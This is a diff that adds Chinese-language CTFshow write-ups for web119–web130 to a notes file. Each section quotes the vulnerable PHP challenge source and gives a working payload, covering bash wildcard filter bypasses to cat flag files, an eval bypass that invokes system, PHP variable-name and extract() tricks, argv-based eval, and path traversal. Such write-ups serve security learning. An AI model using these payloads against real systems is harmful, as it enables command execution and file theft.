@@ -3141,6 +3141,252 @@ ${PATH:${#HOME}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}} ?${PATH:${#RANDOM}:${#SHL
 
 
 
+#### Web119
+
+先用上一题的payload打了一下，显示evil input
+
+测了一下上题用的PATH被ban了
+
+换个方法
+
+```
+${PWD::${#SHLVL}}???${PWD::${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???
+相当于/???/??t ????.???
+匹配/bin/cat ????.???
+```
+
+${#SHLVL}}=1
+
+${PWD::${#SHLVL}} = /
+
+${#HOSTNAME}=4    //用户名的位数，这里用户名是root，故为4
+
+
+
+另一种方法
+
+```
+${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
+相当于/???/?????4 ????.??? 或者 /???/?????5 ????.???
+想要匹配/bin/base64 ????.???
+```
+{#RANDOM} = 4或5
+
+由于可能是5，所以要多试几次，还要进行base64解码
+
+
+
+#### web120
+
+```php
+
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+if(isset($_POST['code'])){
+    $code=$_POST['code'];
+    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){    
+        if(strlen($code)>65){
+            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
+        }
+        else{
+        echo '<div align="center">'.system($code).'</div>';
+        }
+    }
+    else{
+     echo '<div align="center">evil input</div>';
+    }
+}
+
+?>
+```
+
+这题把上题的HOME也ban了，但是第二种方法还能出，而且长度也符合
+
+```
+${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
+```
+
+![image-20250118212249002](assets/image-20250118212249002.png)
+
+
+
+或
+
+```
+${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???
+```
+
+
+
+#### web121
+
+```php
+
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+if(isset($_POST['code'])){
+    $code=$_POST['code'];
+    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){    
+        if(strlen($code)>65){
+            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
+        }
+        else{
+        echo '<div align="center">'.system($code).'</div>';
+        }
+    }
+    else{
+     echo '<div align="center">evil input</div>';
+    }
+}
+
+?>
+```
+
+这题SHLVL被ban了，可以用?代替
+
+${#?}=1
+
+payload
+
+```
+${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???
+```
+
+或
+
+```
+${PWD::${#?}}???${PWD::${#?}}${PWD::${#?}}?? ????.???
+/bin/rev
+```
+
+rev是倒叙输出的
+
+
+
+#### web122
+
+```php
+
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+if(isset($_POST['code'])){
+    $code=$_POST['code'];
+    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\>|\'|\"|\`|\||\,/', $code)){    
+        if(strlen($code)>65){
+            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
+        }
+        else{
+        echo '<div align="center">'.system($code).'</div>';
+        }
+    }
+    else{
+     echo '<div align="center">evil input</div>';
+    }
+}
+
+?>
+```
+
+这题把PWD和#也ban掉了
+
+可以考虑用$?来代替${#1}
+
+$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误
+
+所以我们可以构造payload:
+
+```
+<A;${HOME::$?}???${HOME::$?}????${RANDOM::$?}? ????.??? 
+```
+
+> <A指令不知道是啥，埋个坑
+
+
+
+
+
+
+
+
+
+#### web124
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: 收集自网络
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-06 14:04:45
+
+*/
+
+error_reporting(0);
+//听说你很喜欢数学，不知道你是否爱它胜过爱flag
+if(!isset($_GET['c'])){
+    show_source(__FILE__);
+}else{
+    //例子 c=20-1
+    $content = $_GET['c'];
+    if (strlen($content) >= 80) {
+        die("太长了不会算");
+    }
+    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
+    foreach ($blacklist as $blackitem) {
+        if (preg_match('/' . $blackitem . '/m', $content)) {
+            die("请不要输入奇奇怪怪的字符");
+        }
+    }
+    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
+    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
+    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
+    foreach ($used_funcs[0] as $func) {
+        if (!in_array($func, $whitelist)) {
+            die("请不要输入奇奇怪怪的函数");
+        }
+    }
+    //帮你算出答案
+    eval('echo '.$content.';');
+}
+```
+
+这题设置了白名单和黑名单，白名单是数学函数，黑名单则是一些符号，而且有长度限制
+
+这题的思路其实就是要考虑用数字通过数学运算函数的转换来构造出我们需要用到的字符
+
+就比如我们可以先将需要的字符转换成16进制后再转换成10进制，再执行命令的时候通过数学函数转换回去
+
+[CTFshow-WEB入门-命令执行web124 - Hacker&Cat - 博客园](https://www.cnblogs.com/FallenStar/articles/17064728.html)
+
+```
+目标代码：$_GET['abs']($_GET['acos'])
+```
+
+```
+dechex()，10进制转16进制
+
+base_convert(值,原进制,目标进制)，任意进制转换
+
+hex2bin，16进制转字符串
+```
+
+解题：
+
+base_convert(26941962055,10,34) 为 hex2bin
+
+base_convert(26941962055,10,34)(dechex(1598506324)) 为 _GET
+
+构造payload
+
+```
+c=$pi=base_convert(26941962055,10,34)(dechex(1598506324));$$pi{abs}($$pi{asin})&abs=system&asin=ls
+```
+
 
 
 ------
@@ -3769,6 +4015,10 @@ contents=?<hp pe@av(l_$EG[T]1;)>?
 ```
 
 成功写入一句话木马，拿到flag
+
+
+
+
 
 
 
@@ -5263,6 +5513,379 @@ payload：
 ```
 ?num=%0c36
 ```
+
+
+
+#### web123
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Firebasky
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+error_reporting(0);
+highlight_file(__FILE__);
+include("flag.php");
+$a=$_SERVER['argv'];
+$c=$_POST['fun'];
+if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
+    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/", $c)&&$c<=18){
+         eval("$c".";");  
+         if($fl0g==="flag_give_me"){
+             echo $flag;
+         }
+    }
+}
+?>
+```
+
+这题其实根本不用理会
+
+```
+         if($fl0g==="flag_give_me"){
+             echo $flag;
+         }
+```
+
+这题对c进行了一定的限制，但是影响不大我们可以直接再eval处执行echo $flag;从而拿到flag
+
+这题还有一个考点，由于在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有空格、+、[则会被转化为_，所以按理来说我们构造不出CTF_SHOW.COM这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换
+
+payload:
+
+```
+POST:CTF_SHOW=1&CTF[SHOW.COM=1&fun= echo $flag
+```
+
+
+
+#### web125
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Firebasky
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+#
+#
+*/
+error_reporting(0);
+highlight_file(__FILE__);
+include("flag.php");
+$a=$_SERVER['argv'];
+$c=$_POST['fun'];
+if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
+    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i", $c)&&$c<=16){
+         eval("$c".";");
+         if($fl0g==="flag_give_me"){
+             echo $flag;
+         }
+    }
+}
+?>
+```
+
+这题把上题的echo方法和flag关键词ban了
+
+考虑通过二次传参的方法读flag
+
+我一开始考虑了system二次传参的方法，但是system方法应该是被ban掉了
+
+后面尝试highlight_file方法成功读到flag
+
+payload:
+
+```
+POST CTF_SHOW=1&CTF[SHOW.COM=1&fun=highlight_file($_GET[1])
+GET 1=flag.php
+```
+
+其他的 payload：
+
+```php
+POST CTF_SHOW=&CTF[SHOW.COM=&fun=var_export(get_defined_vars())
+```
+
+#### web126
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Firebasky
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+#
+#
+*/
+error_reporting(0);
+highlight_file(__FILE__);
+include("flag.php");
+$a=$_SERVER['argv'];
+$c=$_POST['fun'];
+if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
+    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i", $c) && strlen($c)<=16){
+         eval("$c".";");  
+         if($fl0g==="flag_give_me"){
+             echo $flag;
+         }
+    }
+}
+
+```
+
+基本上ban掉了能读文件的函数
+
+参考[ctfshow-web入门-php特性（web123、web125、web126）_ctfshow web123-CSDN博客](https://blog.csdn.net/Myon5/article/details/140464776)
+
+payload:
+
+```
+get：?$fl0g=flag_give_me;
+post：CTF_SHOW=&CTF[SHOW.COM=&fun=eval($a[0])
+or
+GET:?$fl0g=flag_give_me
+POST:CTF_SHOW=&CTF[SHOW.COM=&fun=assert($a[0])
+```
+
+这里的查询字符串没有包含 fl0g，但包含了 $fl0g。由于 PHP 中的变量名不包括 $ 符号，所以 isset($_GET['fl0g']) 仍然会返回 false，即没有检测到 fl0g 参数。
+
+post 传入 CTF_SHOW 和 CTF_SHOW.COM 确保 isset($_POST['CTF_SHOW']) && isset($_POST['CTF_SHOW.COM']) 这部分条件为真，fun=eval($a[0]) 将 eval($a[0]) 的代码传递给 $c。
+
+准确来说，此时的 $_SERVER[‘argv’][0] 就等于 $_SERVER[‘QUERY_STRING’]，$_SERVER["QUERY_STRING"] 就是查询 (query) 的字符串，这是由于 php.ini 开启了register_argc_argv 配置项。
+
+当访问 ?$fl0g=flag_give_me; 时，服务器配置使得查询字符串被传递到 $_SERVER['argv'] 中。
+在这种配置下，$_SERVER['argv'][0] 包含了整个查询字符串，即 '$fl0g=flag_give_me;'。
+
+在 eval("$c;"); 中实际执行的是 eval('eval($a[0]);');，因为 $a[0] 是 '$fl0g=flag_give_me;'，这相当于执行了 eval('$fl0g=flag_give_me;');，这样就定义了变量 $fl0g 并赋值为 'flag_give_me'。
+
+最后 判断 if($fl0g === "flag_give_me")，因为 $fl0g 被正确地设置为了 'flag_give_me'，所以这个条件为真，因此，echo $flag; 被执行，输出 $flag。
+
+
+
+
+
+其他payload:
+
+```
+GET:?a=1+fl0g=flag_give_me
+POST:CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])
+```
+
+也同样是为了使fl0g=flag_give_me
+
+
+
+#### web127
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-10 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-10 21:52:49
+
+*/
+
+
+error_reporting(0);
+include("flag.php");
+highlight_file(__FILE__);
+$ctf_show = md5($flag);
+$url = $_SERVER['QUERY_STRING'];
+
+
+//特殊字符检测
+function waf($url){
+    if(preg_match('/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\<|\,|\>|\.|\\\|\//', $url)){
+        return true;
+    }else{
+        return false;
+    }
+}
+
+if(waf($url)){
+    die("嗯哼？");
+}else{
+    extract($_GET);
+}
+
+
+if($ctf_show==='ilove36d'){
+    echo $flag;
+}
+```
+
+变量覆盖
+
+由于下划线被waf了，我们可以传ctf%20show，php会将空格解析成_
+
+payload:
+
+```
+ctf%20show=ilove36d
+```
+
+
+
+#### web128
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-10 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-12 19:49:05
+
+*/
+
+
+error_reporting(0);
+include("flag.php");
+highlight_file(__FILE__);
+
+$f1 = $_GET['f1'];
+$f2 = $_GET['f2'];
+
+if(check($f1)){
+    var_dump(call_user_func(call_user_func($f1,$f2)));
+}else{
+    echo "嗯哼？";
+}
+
+
+
+function check($str){
+    return !preg_match('/[0-9]|[a-z]/i', $str);
+} 
+```
+什么是Gettext函数
+
+[PHP: Gettext - Manual](https://www.php.net/manual/zh/book.gettext.php)
+
+骚操作
+
+```
+小知识点： _()是一个函数
+
+_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll
+
+get_defined_vars()函数
+
+get_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag
+
+payload: ?f1=_&f2=get_defined_vars
+```
+
+
+
+#### web129
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-13 03:18:40
+
+*/
+
+
+error_reporting(0);
+highlight_file(__FILE__);
+if(isset($_GET['f'])){
+    $f = $_GET['f'];
+    if(stripos($f, 'ctfshow')>0){
+        echo readfile($f);
+    }
+}
+```
+
+stripos() 函数查找字符串在另一字符串中第一次出现的位置
+
+所以我们要考虑在ctfshow前面放点什么，但又不影响我们读文件
+
+可以联想到目录穿越
+
+payload:
+
+```
+/ctfshow/../../../../../../../../../../var/www/html/flag.php
+```
+
+
+
+#### web130
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-13 05:19:40
+
+*/
+
+
+error_reporting(0);
+highlight_file(__FILE__);
+include("flag.php");
+if(isset($_POST['f'])){
+    $f = $_POST['f'];
+
+    if(preg_match('/.+?ctfshow/is', $f)){
+        die('bye!');
+    }
+    if(stripos($f, 'ctfshow') === FALSE){
+        die('bye!!');
+    }
+
+    echo $flag;
+
+}
+```
+
+> '/.+?ctfshow/is' 后面的i表示大小写匹配，s表示忽略换行符，单行匹配
+>
+> 在不加转义字符的前提下，前面的点表示任意字符，而“+?”表示非贪婪匹配，即前面的字符至少出现一次
+>
+> 所以，该正则匹配的意思为：ctfshow前面如果出现任意字符，即匹配准确
+>
+> 再根据下面的stripos为字符串匹配函数，要求输入的参数必须有“ctfshow”字符，所以输入的参数只需要满足ctfshow前面不加任意字符即可
+
+payload
+
+```
+POST f=ctfshow
+```
+
+
 
 
 
